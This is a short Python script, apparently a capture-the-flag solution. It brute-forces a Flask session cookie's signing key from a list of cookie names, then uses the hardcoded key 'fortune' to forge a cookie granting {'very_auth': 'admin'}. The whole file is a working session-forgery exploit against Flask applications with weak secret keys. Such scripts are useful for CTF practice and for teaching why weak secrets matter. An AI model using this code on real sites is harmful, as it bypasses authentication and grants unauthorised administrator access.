import hashlib
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner
import sys
import requests
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz",
                "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
cookie = sys.argv[1]
salt = "cookie-session"
digest_method = hashlib.sha1
key_derivation = "hmac"
session_json_serializer = TaggedJSONSerializer()
serializer = session_json_serializer
signer_kwargs = dict(
    key_derivation=key_derivation, digest_method=digest_method
)
secret_key = ""
for secret in cookie_names:
    sed = URLSafeTimedSerializer(
        secret_key=secret,
        salt=salt,
        serializer=serializer,
        signer_kwargs=signer_kwargs
    )
    try:
        sed.loads(cookie)
        secret_key = secret
        print("secret key: ", secret)
    except:
        continue
sed = URLSafeTimedSerializer(
    secret_key='fortune',
    salt=salt,
    serializer=serializer,
    signer=TimestampSigner,
    signer_kwargs=signer_kwargs
)
session = {'very_auth': 'admin'}
new_cookie = sed.dumps(session)
print("new cookie: ",new_cookie)
